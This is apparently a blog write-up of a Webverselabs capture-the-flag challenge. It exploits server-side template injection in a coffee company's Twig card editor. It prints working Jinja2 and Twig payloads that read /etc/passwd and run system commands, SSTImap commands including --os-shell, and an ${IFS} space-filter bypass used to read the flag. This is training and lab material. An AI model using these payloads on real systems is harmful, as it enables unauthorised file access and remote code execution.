---
title: "Webverselabs Folio Coffee Co Challenge SSTI  "
date: 2026-06-13 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Medium , Challenge , Web_Attacks ]
---


## Scenario : 


Folio Coffee Co is a small direct-trade roaster in Asheville. Their subscription is built around the printed card that ships in each bag — a personalized note with the lot name, ship date, and brew suggestion. The dev who wired up the customer-facing card editor wanted real Twig syntax (`{% if partner_gift %}…{% endif %}`) so subscribers could conditionally tailor their card. The sandbox extension would have blocked the conditionals. He turned it off and shipped.


## Solution : 


<img width="1886" height="897" alt="image" src="https://github.com/user-attachments/assets/42a6bb7f-f694-4229-a259-e274d2074239" />

Upon visiting the application, we find 3 endpoints : 

**/Shop** : which lists a bunch of machines, with their prices : 

<img width="1304" height="783" alt="image" src="https://github.com/user-attachments/assets/6f400c80-7d74-4e76-9909-65ec8233905e" />

If we visit any of the products , we see that the GET request doesn't contain any parameter in the URL. 

<img width="1320" height="667" alt="image" src="https://github.com/user-attachments/assets/2c3e9d0b-16ca-4183-b08d-6fad26bee35e" />

So Nothing useful for us here . 

**/journal** is just a static page : 

<img width="1211" height="753" alt="image" src="https://github.com/user-attachments/assets/4ed2459a-9b47-45c7-8910-7b8cfca478f0" />

And finally the **/about** endpoint is also a static page that explains their buisness model. 

<img width="1164" height="790" alt="image" src="https://github.com/user-attachments/assets/b5c93c27-36f7-429c-9a4b-65beaeae63ba" />

Now let's create an account to be able to enumerate the application further . 

<img width="1378" height="870" alt="image" src="https://github.com/user-attachments/assets/7c9899d0-0c5b-4f15-86e2-41d4ddbbd5ce" />

Once we login , we see that we are able to create our own shipment card :

{% raw %}
```bash
Hi {{ first_name }} —

This month we're sending you {{ roast_name }}.
{% if partner_gift %}With a note from your partner inside.{% endif %}

Ships {{ ship_date }}.

— Folio
```
{% endraw %}

This is the initial template we got, now first thing we should do is use this one to see what fields are returned to us; If we click on Preview card : 

<img width="1170" height="732" alt="image" src="https://github.com/user-attachments/assets/a591dce4-1bec-433d-a455-3916e83cafb8" />

We see that our username is returned back to us, having the brackets inside the code is already a huge indicator that this might be vulnerable to an SSTI , but the fact that the only thing that changes is the username is also an indicator that a Template is being used . 

I already have a detailed section on my Web_App methdology for SSTI injections that i will be following : 

```bash
https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#ssti-
```

{% raw %}
```bash
# Detection payload:
${7*7}
{{7*7}}
# Follow this graph to identify the engine:
# https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
```
{% endraw %}
**Exploitation : Jinja2**
{% raw %}
```python
# 1/ Information Disclosure :
{{ config.items() }}


# 2/ LFI :
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# 3/ RCE :
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Exploitation : Twig**

```php
# 1/ Information Disclosure :
{{ _self }}

# 2/ LFI :
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# 3/ RCE :
{{ ['id'] | filter('system') }}
```
{% endraw %}


**Automation :**

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

Now first i injected a simple payload 7*7 and based on the response we would know wether or not our code was executed and if we have an SSTI or not , if we get 49 rendered to us this means we got our code executed . 

After that based on the Response we get from the server , we would know which Engine is being used . We will follow this diagram from Payload All the Things . 

<img width="1094" height="475" alt="image" src="https://github.com/user-attachments/assets/abaec2d0-5ba9-44cc-89c9-d6997cfe14bd" />

Now first let's inject our payload :

<img width="1279" height="754" alt="image" src="https://github.com/user-attachments/assets/1cd7187c-4985-44be-8e25-4da6d2259212" />

I injected it more than once , you don't need to do that since the server will take the entire request and execute it . 

<img width="1215" height="809" alt="image" src="https://github.com/user-attachments/assets/8fa059a6-c5ae-4e2a-a0d1-43e7e6538297" />

We see that our code was executed , which confirms our SSTI , now we can follow the guide from Payload all things to know which engine is being used . 

To save time i will inject the payload for both Jinja and Twig and based on if we get a response i will know which one is used .

First i injected the information disclosure payload for Jinja :

<img width="1122" height="450" alt="image" src="https://github.com/user-attachments/assets/79aea158-d399-46bf-8e64-1e0e518f79ae" />

After clicking on Preview , we get a template error : 

<img width="928" height="603" alt="image" src="https://github.com/user-attachments/assets/cf01e953-f56a-419c-90dd-2848d83be907" />

So we know it is not Jinja , let's hope it's twig :)

<img width="1171" height="687" alt="image" src="https://github.com/user-attachments/assets/a59e4db5-9020-4767-bf3a-ecb501cf870d" />

Now if we preview it : 

<img width="961" height="603" alt="image" src="https://github.com/user-attachments/assets/b706eeab-0f36-4fd7-bee7-ab50cdd57edb" />

It worked , so Twig is the engine used . 

We can try and check if our RCE payload will get executed : 

<img width="1107" height="674" alt="image" src="https://github.com/user-attachments/assets/f7d6c820-6303-44dd-9eb4-cc373aad52af" />

If we preview it : 

<img width="922" height="548" alt="image" src="https://github.com/user-attachments/assets/5407ddba-aeae-4523-800c-fcb1204b6799" />

Perfect now we can use this to read our flag (If space doesn't work try ${IFS} to bypass the space filter ) : 

{% raw %}
```python
# 3/ RCE :
{{ ['cat${IFS}/flag.txt'] | filter('system') }}
```
{% endraw %}

<img width="946" height="670" alt="image" src="https://github.com/user-attachments/assets/f0306d4e-396b-41a7-a1cd-54e2aab07a46" />

And we get our flag . 

That was all for this challenge , see you in the next one :)


